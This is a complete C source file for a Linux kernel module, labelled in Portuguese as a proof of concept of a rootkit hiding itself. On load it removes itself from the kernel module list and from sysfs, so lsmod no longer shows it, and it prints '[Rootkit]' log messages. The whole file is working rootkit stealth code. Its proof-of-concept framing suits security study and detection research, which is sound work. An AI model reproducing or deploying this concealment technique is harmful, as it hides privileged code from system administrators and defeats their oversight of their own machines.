#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/list.h>
#include <linux/fs.h>
#include <asm/segment.h>
#include <asm/uaccess.h>
#include <linux/buffer_head.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Breno Nascimento");
MODULE_DESCRIPTION("Prova de Conceito - Ocultacao de modulo");

static int __init poc_init(void) {
    printk(KERN_INFO "[Rootkit] Modulo carregado na memoria.\n");

    list_del_init(&THIS_MODULE->list);

    kobject_del(&THIS_MODULE->mkobj.kobj);

    printk(KERN_INFO "[Rootkit] Modulo oculto para o lsmod!\n");

    return 0;
}

static void __exit poc_exit(void) {
    printk(KERN_INFO "[Rootkit] Modulo descarregado.\n");
}

module_init(poc_init);
module_exit(poc_exit);
